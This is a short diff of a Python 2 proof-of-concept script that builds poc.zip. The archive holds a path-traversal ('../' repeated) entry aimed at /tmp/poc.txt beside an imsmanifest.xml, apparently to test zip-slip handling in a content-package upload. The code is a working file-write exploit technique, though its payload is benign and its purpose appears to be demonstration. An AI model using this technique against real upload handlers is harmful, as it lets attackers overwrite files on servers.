@@ -5,7 +5,7 @@ from cStringIO import StringIO
 def _build_zip():
     f = StringIO()
     z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
-    z.writestr('../../../../../../../../poc.txt', 'content')
+    z.writestr('../../../../../../../../tmp/poc.txt', 'content')
     z.writestr('imsmanifest.xml','<tag</tag>')
     z.close()
     zip = open('poc.zip', 'wb')
